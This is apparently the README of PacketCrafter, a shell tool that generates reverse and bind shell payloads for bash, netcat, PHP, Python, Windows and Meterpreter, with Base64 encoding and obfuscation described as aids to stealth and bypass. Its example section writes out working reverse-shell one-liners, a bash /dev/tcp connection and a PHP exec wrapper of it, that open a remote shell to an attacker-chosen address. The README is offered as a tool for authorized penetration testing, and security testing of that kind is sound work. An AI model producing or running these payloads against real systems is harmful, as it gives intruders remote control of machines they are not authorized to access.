# **PacketCrafter**

PacketCrafter is a versatile and intuitive payload generator for various reverse and bind shells. Designed with simplicity in mind, this tool is a powerful asset for penetration testers, ethical hackers, and cybersecurity enthusiasts. It supports multiple payload types, encoding, and obfuscation techniques to ensure seamless exploitation in controlled environments.

## **Features**

- **Bash Reverse Shell**: Generate bash payloads for reverse shell connections.  
- **Netcat Reverse Shell**: Create Netcat payloads to initiate reverse shells.  
- **Bash Bind Shell**: Produce bash payloads for bind shells, allowing connections from remote hosts.  
- **Meterpreter Reverse TCP**: Leverage `msfvenom` to create Meterpreter payloads for Windows systems.  
- **PHP Reverse Shell**: Generate PHP scripts for reverse shell execution.  
- **Python Reverse Shell**: Craft Python payloads for reverse shells over TCP.  
- **Windows Reverse Shell**: Use Netcat to generate reverse shell payloads for Windows.  
- **Payload Encoding**: Encode payloads in Base64 for stealth and bypass techniques.  
- **Payload Obfuscation**: Apply simple obfuscation techniques for added stealth.  

## **Requirements**

1. Linux-based operating system.  
2. Tools and dependencies:
   - `figlet` for banner display.
   - `msfvenom` for generating Meterpreter payloads.
   - `nc` (Netcat) for reverse and bind shells.  
3. Python 3.x (for specific reverse shells).  

## **Usage**

1. Clone the repository:
   ```bash
   git clone https://github.com/yourusername/PacketCrafter.git
   cd PacketCrafter
   ```

2. Make the script executable:
   ```bash
   chmod +x PacketCrafter.sh
   ```

3. Run the script:
   ```bash
   ./PacketCrafter.sh
   ```

4. Follow the menu options to generate the desired payload.

## **Menu Options**

Upon execution, you'll see a menu with the following options:

1. **Generate Bash Reverse Shell**  
2. **Generate Netcat Reverse Shell**  
3. **Generate Bash Bind Shell**  
4. **Generate Meterpreter Reverse TCP**  
5. **Generate PHP Reverse Shell**  
6. **Generate Python Reverse Shell**  
7. **Generate Windows Reverse Shell**  
8. **Encode Payload in Base64**  
9. **Obfuscate Payload**  
10. **Exit**  

## **Example Usage**

- **Bash Reverse Shell**  
  Enter the IP address and port to create the payload. The script generates a file named `bash_reverse_shell.sh`. Example payload:  
  ```bash
  bash -i >& /dev/tcp/<ip>/<port> 0>&1
  ```

- **PHP Reverse Shell**  
  Example payload saved as `php_reverse_shell.php`:  
  ```php
  <?php exec('/bin/bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"'); ?>
  ```

- **Base64 Encoding**  
  Encodes a payload into Base64 for stealthy deployment:
  ```bash
  base64 bash_reverse_shell.sh > bash_reverse_shell.sh.b64
  ```

## **Customization**

Feel free to customize the script to add additional payload types or advanced obfuscation techniques. Modify the functions in the script to suit your specific requirements.

## **Disclaimer**

**PacketCrafter is intended for educational purposes and authorized penetration testing only. Unauthorized use of this tool is strictly prohibited. The developers assume no responsibility for misuse.**
